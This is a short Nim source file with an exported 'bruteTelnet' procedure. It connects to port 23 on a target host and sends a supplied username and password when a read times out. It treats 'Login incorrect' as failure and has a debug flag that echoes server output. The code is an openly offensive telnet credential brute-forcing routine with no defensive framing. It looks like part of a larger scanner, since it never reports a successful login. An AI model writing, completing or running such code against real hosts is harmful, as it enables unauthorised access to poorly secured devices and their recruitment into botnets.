import net, nativesockets

var bruteDebug*: bool

export bruteDebug

proc bruteTelnet*(host: string, user: string, pass: string): bool =
  var
    sock = newSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    line: string
  try:
    sock.connect(host, Port(23), 10000)
  except:
    return false
  while true:
    try:
      line = recvLine(sock, 1000)
      if line == ("Login incorrect"):
        sock.close()
        return false
      else:
        if bruteDebug == false:
          discard
        else:
          echo(line)
    except:
      sock.send(user & "\n")
      sock.send(pass & "\n")
